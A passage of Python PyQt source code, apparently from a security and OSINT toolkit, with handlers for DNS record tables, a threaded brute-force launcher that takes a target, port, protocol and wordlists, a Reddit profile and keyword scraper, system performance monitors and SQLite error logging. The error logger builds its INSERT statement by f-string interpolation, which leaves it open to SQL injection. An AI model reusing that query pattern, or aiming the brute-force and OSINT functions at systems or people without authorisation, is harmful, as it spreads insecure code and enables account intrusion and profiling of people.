            ) if dns_list[5] == 'NONE' else self.dns_table_formatting(
                self.dns_NS_table, dns_list[5], 'NS'
            )

    def dns_table_formatting(self, table_object, list, name):
        row = 0
        ## mockup to reduce code
        self.dns_table = table_object
        ## formatting, aka autostretch

        self.dns_table.horizontalHeader().setStretchLastSection(True)
        self.dns_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.Stretch
        )

        ## calculating rows n columns
        try:
            self.dns_table.setRowCount(len(list))
        except:
            self.dns_table.setRowCount(5)
        self.dns_table.setColumnCount(1)
        self.dns_table.setHorizontalHeaderLabels([name])

        # print(list)

        if (
            name == 'Reverse Lookup'
        ):   ## special exception for PTR records, bandaid fix, will figure out later
            for i in list.splitlines():
                self.dns_table.setItem(row, 0, QTableWidgetItem(i))
                self.dns_table.setRowHeight(row, 13)
                row = row + 1

        else:
            for i in list:
                self.dns_table.setItem(row, 0, QTableWidgetItem(i))
                self.dns_table.setRowHeight(row, 13)
                row = row + 1

    ## Bruteforce
    def bruteforce_thread(self):
        bf_thread = threading.Thread(target=self.bruteforce)
        bf_thread.start()

    def bruteforce(self):
        ##init class object
        B = Bruteforce()
        
        input_list = [
            self.bruteforce_target.text(), 
            self.bruteforce_port.text(),
            self.bruteforce_protocol.currentText(),
            self.bruteforce_userdir.text(),
            self.bruteforce_passdir.text(),
            self.bruteforce_urldir.text(),
            ]
        
        B.framework(input_list)
        
        '''        
        ip = input_list[0]
        port = input_list[1]
        protocol = input_list[2]
        user_wordlist_dir = input_list[3]
        pass_wordlist_dir = input_list[4]'''
        
        pass

    ## ========================================
    ## OSINT Tab ==============================
    ## ========================================
    def osint_reddit(self):
        osint_red = threading.Thread(target=self.osint_reddit_thread)
        osint_red.start()

    def osint_reddit_thread(self):
        self.reddit_progressbar.setValue(10)

        from Modules.General.OSINT.reddit_osint import reddit

        ## need to init the class by calling it first durrrr
        r = reddit()

        ##search_list: search_term, subreddit, time, sort, limit
        keyword = self.osint_reddit_keyword.text()
        subreddit = self.osint_reddit_subreddit.text()

        ## == Error handling

        if keyword == '':
            self.ERROR(
                "'Keyword' Field Empty",
                'low',
                "Enter a value in the 'Keyword' field, or * for all results",
            )
            self.reddit_progressbar.setValue(0)

        else:
            sort = self.combo_sort.currentText().lower()
            ## Supposed to block out button if not 'top'd, not working, maybe needs a signal on change
            if sort != 'top':
                self.combo_time.setDisabled(True)
            else:
                self.combo_time.setDisabled(False)

            time = self.combo_time.currentText().lower()
            limit = 10

            ## Options list: download_media, only_comments, only_profile, search_subbreddit
            download_media = self.osint_reddit_downloadmedia.isChecked()
            only_comments = self.osint_reddit_onlycomments.isChecked()
            only_profile = self.osint_reddit_onlyprofile.isChecked()

            # if subreddit empty, don't search by sub
            if subreddit != '':
                search_subbreddit = False
            else:
                search_subbreddit = True

            search_list = [keyword, subreddit, time, sort, limit]
            options_list = [
                download_media,
                only_comments,
                only_profile,
                search_subbreddit,
            ]

            r.main(search_list, options_list)

            self.osint_reddit_search.setText('-->> Search <<--')
            ## bar
            ## its putting the bar at 100% right away due to it being after the r.main... hmmm need a way to fix that
            maxval = r.total_posts
            currentval = r.current_post

            self.reddit_progressbar.setMaximum(maxval)
            self.reddit_progressbar.setValue(currentval)

    ## ========================================
    ## Other Tab ==============================
    ## ========================================
    def performance(self):
        p_thread = threading.Thread(target=self.p_thread)
        # thread = threading.Thread(target=self.listen_popup())

        p_thread.start()

    def p_thread(self):
        u = utility.Performance()
        while True:
            ## Current System CPU
            current_cpu_all = u.CPU_all()
            self.other_performance_cpuall.setValue(int(current_cpu_all))

            ## Current system RAM
            current_ramusage_all = u.RAM_all()
            self.other_performance_ramall.setValue(int(current_ramusage_all))

            time.sleep(1)

    def performance_networkspeed(self):
        # print("CLICKED")
        p_thread = threading.Thread(target=self.netspeed_thread)
        p_thread.start()

    def netspeed_thread(self):
        self.performance_speedtest.setText('Running...')
        self.performance_speedtest.setDisabled(True)

        netspec = self.N
        # netspec = utility.Network()
        self.performance_lcd_upload.display(netspec.upload())
        self.performance_lcd_download.display(netspec.download())
        self.performance_lcd_ping.display(netspec.ping())

        self.performance_speedtest.setDisabled(False)
        self.performance_speedtest.setText('Run SpeedTest')

    ## ========================================
    ## SQL Conmn ==============================
    ## ========================================

    def db_error_write(self, error_list):
        import sqlite3

        try:
            # print(insert_list)
            ## Accesing DB in root dir

            sqliteConnection = sqlite3.connect('logec_db')

            cursor = sqliteConnection.cursor()

            ## if append is not true:
            # [severity, error, fix, "time", "date"]

            sqlite_insert_query = f"""INSERT INTO Error (Severity, ErrorMessage, Fix, Time, Date) 
            VALUES
            ("{error_list[0]}", "{error_list[1]}", "{error_list[2]}", '{error_list[3]}', '{error_list[4]}')"""

            count = cursor.execute(sqlite_insert_query)
            sqliteConnection.commit()
            cursor.close()

        except sqlite3.Error as error:
            print('Error:', error)

        finally:
            if sqliteConnection:
                sqliteConnection.close()

        self.custom_query('performance_error_db')

        ## Giving the DB a refresh


def createConnection():

    con = QSqlDatabase.addDatabase('QSQLITE')
    con.setDatabaseName(syspath.path + '/logec_db')

    ## Qapp throwing a fit due to no DB and no constructed app
    ## No DB outside of this dir, need to add that in setup too
    if not con.open():
        try:
            QMessageBox.critical(
                None,
                'QTableView Example - Error!',
                'Database Error: %s' % con.lastError().databaseText(),
            )
            return False
        except:
            print('Error connecting to DB & QApp not constructed.')
    return True


if __name__ == '__main__':
    try:
        ## Connecting to DB
        ## This has to go on top
        if not createConnection():
            print('FAILURE TO CONNECT TO DB')
            sys.exit(1)

        app = QtWidgets.QApplication(sys.argv)
        window = MyApp()

        ## if pwd not equlal to stored syspath, redo syspath
        ## handy for if the folder ever gets moved

        ## Icon
        app_icon = QIcon(syspath.path + '/Gui/themes/assets/icon.png')
        print(syspath.path + '/Gui/themes/assets/icon.png')
        app.setWindowIcon(app_icon)

        # future theme
        """
        with open("Gui/themes/green-gray2.css","r") as f:
            theme = f.read()
        app.setStyleSheet(theme)"""

        window.show()

        app.exec_()
        # sys.exit()
        pid = os.getpid()
        os.kill(pid, 15)   ## SIGTERM

    except Exception as e:
        print(f'ERROR OCCURED: \n{e}')
